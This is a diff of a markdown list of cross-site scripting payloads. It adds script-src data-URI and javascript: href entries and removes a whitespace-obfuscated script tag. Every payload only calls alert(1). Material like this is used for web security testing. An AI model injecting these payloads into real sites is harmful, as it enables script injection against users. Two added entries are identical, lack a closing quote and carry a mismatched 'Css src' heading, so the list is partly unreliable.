@@ -18,7 +18,17 @@
 <img src=x onerror="something();"/>
 ```
 
-### No Space
+### Script src
+```
+<script src="data:\xD4\x8F,javascript:alert(1)">
+```
+
+### A Tag
 ```html
-<script\x20type="text/javascript">javascript:alert(1);</script>
+<a href="javascript:alert(1)>
+```
+
+### Css src
+```html
+<a href="javascript:alert(1)>
 ```
